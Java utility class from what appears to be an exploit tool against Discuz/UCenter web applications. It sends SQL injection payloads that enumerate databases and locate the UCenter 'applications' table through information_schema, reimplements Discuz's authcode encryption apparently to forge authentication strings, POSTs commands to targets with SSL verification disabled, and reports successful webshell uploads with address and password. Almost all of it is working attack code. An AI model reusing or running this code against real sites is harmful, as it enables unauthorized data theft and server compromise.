package cn.com.nike.policy.util;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.binary.Hex;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.apache.log4j.Logger;

/**
 * @category 策略工具类
 * @author nike
 * @version 1.0
 */
public class PolicyUtil {

	private static Logger log = Logger.getLogger(PolicyUtil.class);

	/**
	 * 正则匹配
	 * 
	 * @param regex
	 *            正则表达式
	 * @param content
	 *            需要匹配的内容
	 * @param index
	 *            匹配的的索引值
	 * @return 返回指定索引的全部匹配内容
	 */
	public static List<String> regex(String regex, String content, int index) {

		if (StringUtils.isEmpty(regex) || StringUtils.isEmpty(content)) {
			throw new IllegalArgumentException("参数无效");
		}

		List<String> result = new ArrayList<String>();
		Pattern pattern = Pattern.compile(regex);
		Matcher matcher = pattern.matcher(content);

		while (matcher.find()) {
			result.add(matcher.group(index));
		}

		return result;
	}

	/**
	 * 列出所有数据库名
	 * 
	 * @param weburl
	 *            访问地址
	 * @param payload
	 * @param regex
	 *            正则表达式
	 * @param index
	 * @return
	 * @throws IOException
	 */
	public static List<String> listDbs(String weburl, String payload,
			String regex, int index) throws IOException {

		if (StringUtils.isEmpty(payload) || StringUtils.isEmpty(regex)) {
			throw new IllegalArgumentException("参数无效");
		}

		List<String> dbs = new ArrayList<String>();

		String countPayload = payload.replace("$$",
				"select%20count(*)%20from%20information_schema.SCHEMATA");

		CloseableHttpClient httpClient = HttpClients.createDefault();
		CloseableHttpResponse httpResponse = null;
		try {
			HttpGet httpGet = new HttpGet(weburl + countPayload);
			httpResponse = httpClient.execute(httpGet);

			HttpEntity entity = httpResponse.getEntity();
			String content = EntityUtils.toString(entity);

			List<String> res = regex(regex, content, index);
			int dbCount = 0;
			if (res.size() > 0)
				dbCount = Integer.parseInt(res.get(0));
			log.info(dbCount + "个数据库");

			for (int i = 0; i < dbCount; i++) {
				String dbPayload = payload.replace("$$",
						"select%20SCHEMA_NAME%20from%20information_schema.SCHEMATA%20limit%20"
								+ i + ",1");
				httpGet = new HttpGet(weburl + dbPayload);
				httpResponse = httpClient.execute(httpGet);
				entity = httpResponse.getEntity();
				content = EntityUtils.toString(entity);
				String dbName = "";
				res = regex(regex, content, index);
				if (res.size() == 1)
					dbName = res.get(0);

				if (dbName.matches("(information_schema|mysql|test)"))
					continue;

				log.info("find db " + dbName);
				dbs.add(dbName);
			}
		} catch (Exception e) {
			log.error("", e);
		} finally {
			httpClient.close();
			if (httpResponse != null)
				httpResponse.close();
		}

		return dbs;
	}

	public static String listUcTableName(String weburl, String payload,
			String regex, int index) throws IOException {

		if (StringUtils.isEmpty(payload) || StringUtils.isEmpty(regex)) {
			throw new IllegalArgumentException("参数无效");
		}

		String countPayload = payload.replace("$$",
				"select%20count(*)%20from%20information_schema.tables");

		CloseableHttpClient httpClient = HttpClients.createDefault();
		CloseableHttpResponse httpResponse = null;
		try {
			HttpGet httpGet = new HttpGet(weburl + countPayload);
			httpResponse = httpClient.execute(httpGet);

			HttpEntity entity = httpResponse.getEntity();
			String content = EntityUtils.toString(entity);

			List<String> res = regex(regex, content, index);
			int tbCount = 0;
			if (res.size() > 0)
				tbCount = Integer.parseInt(res.get(0));
			log.info(tbCount + "个表");

			for (int i = 0; i < tbCount; i++) {
				String dbPayload = payload
						.replace(
								"$$",
								"select%20hex(cast(table_name%20as%20char))%20from%20information_schema.tables%20order%20by%20table_schema%20desc%20limit%20"
										+ i + ",1");
				httpGet = new HttpGet(weburl + dbPayload);
				httpResponse = httpClient.execute(httpGet);
				entity = httpResponse.getEntity();
				content = EntityUtils.toString(entity);
				String dbName = "";
				res = regex(regex, content, index);
				if (res.size() == 1)
					dbName = res.get(0);
				String tablename = org.apache.commons.codec.binary.StringUtils
						.newStringUtf8(Hex.decodeHex(dbName.toCharArray()));
				if (!tablename.contains("applications")) {
					log.info(tablename + " skip");
					continue;
				} else {
					log.info(tablename);
					return tablename;
				}

			}

		} catch (Exception e) {
			log.error("", e);
		} finally {
			httpClient.close();
			if (httpResponse != null)
				httpResponse.close();
		}

		return null;
	}

	/**
	 * 模拟PHP的microtime函数
	 * 
	 * @return
	 */
	public static String microtime() {
		String a = String.valueOf(System.nanoTime());
		return "0." + a.substring(10, a.length() - 1) + " "
				+ a.substring(0, 10);
	}

	/**
	 * 拼byte数组
	 * 
	 * @param b
	 * @return
	 */
	protected static byte[] toByteArray(Byte[] b) {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		for (byte bs : b) {
			bos.write(bs);
		}
		return bos.toByteArray();
	}

	/**
	 * 模拟PHP的time函数
	 * 
	 * @return
	 */
	public static String time() {
		return String.valueOf(System.currentTimeMillis()).substring(0, 10);
	}

	/**
	 * Discuz 授权 Encode
	 * 
	 * @param $string
	 * @param ucKey
	 * @return
	 */
	public static String auth(String $string, String ucKey) {
		int $ckey_length = 4;
		String $key = DigestUtils.md5Hex(ucKey);
		String $keya = DigestUtils.md5Hex($key.substring(0, 16));
		String $keyb = DigestUtils.md5Hex($key.substring(16, 32));
		String microtime = DigestUtils.md5Hex(microtime());
		String $keyc = microtime.substring(microtime.length() - $ckey_length,
				microtime.length());
		String $cryptkey = $keya + DigestUtils.md5Hex($keya + $keyc);
		String sb = DigestUtils.md5Hex($string + $keyb).substring(0, 16);
		$string = String.format("%010d", 0) + sb + $string;
		int $string_length = $string.length();

		Map<Integer, Integer> box = new LinkedHashMap<Integer, Integer>();
		for (int i = 0; i <= 255; i++) {
			box.put(i, i);
		}

		List<Integer> ls = new ArrayList<Integer>();
		char[] $cryptkeyArray = $cryptkey.toCharArray();
		int r = 0;
		for (int i = 0; i <= 255; i++) {
			r = r == $cryptkeyArray.length ? 0 : r;
			ls.add((int) $cryptkeyArray[r]);
			r++;
		}
		int p = 0;
		for (int i = 0; i < 256; i++) {
			int $tmp = (Integer) box.get(i);
			p = (p + $tmp + ls.get(i)) % 256;
			box.put(i, box.get(p));
			box.put(p, $tmp);
		}

		List<Byte> bs = new ArrayList<Byte>();
		char[] $stringArray = $string.toCharArray();
		int a = 0, j = 0;
		for (int i = 0; i < $string_length; i++) {
			a = (a + 1) % 256;
			j = (j + box.get(a)) % 256;
			int $tmp = box.get(a);
			box.put(a, box.get(j));
			box.put(j, $tmp);
			int s = ((int) $stringArray[i] ^ box
					.get((box.get(a) + box.get(j)) % 256));
			bs.add((byte) s);
		}
		byte[] bb = toByteArray(bs.toArray(new Byte[bs.size()]));
		return $keyc + (Base64.encodeBase64String(bb).replace("=", ""));
	}

	/**
	 * 简单的发送http
	 * 
	 * @param url
	 * @return
	 * @throws IOException
	 */
	public static String sendGet(String url) throws IOException {
		CloseableHttpClient httpclient = HttpClients.createDefault();
		CloseableHttpResponse response = null;
		String content = "";
		try {
			HttpGet httpget = new HttpGet(url);
			response = httpclient.execute(httpget);
			HttpEntity entity = response.getEntity();
			content = EntityUtils.toString(entity);
		} catch (Exception e) {
			log.error("利用异常", e);
		} finally {
			if (response != null)
				response.close();
			httpclient.close();
		}
		return content;
	}

	/**
	 * 发送POST请求
	 * 
	 * @param $cmd
	 * @param $url
	 * @param timeOut
	 * @return
	 */
	public static String send(String $url, String $cmd, int timeOut) {
		try {
			URL u = new URL($url);
			// 忽略HTTPS请求证书验证
			if ("https".equalsIgnoreCase(u.getProtocol())) {
				SslUtils.ignoreSsl();
			}
			URLConnection conn = u.openConnection();
			conn.setConnectTimeout(timeOut);
			conn.setReadTimeout(timeOut);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.getOutputStream().write($cmd.getBytes());
			return IOUtils.toString(conn.getInputStream(), "UTF-8");
		} catch (Exception e) {
			log.error("", e);
		}
		return $url;
	}

	public static String successMessage(String shellUrl, String pass) {
		return "上传webshell成功 地址=" + shellUrl + " 密码=" + pass;
	}
}
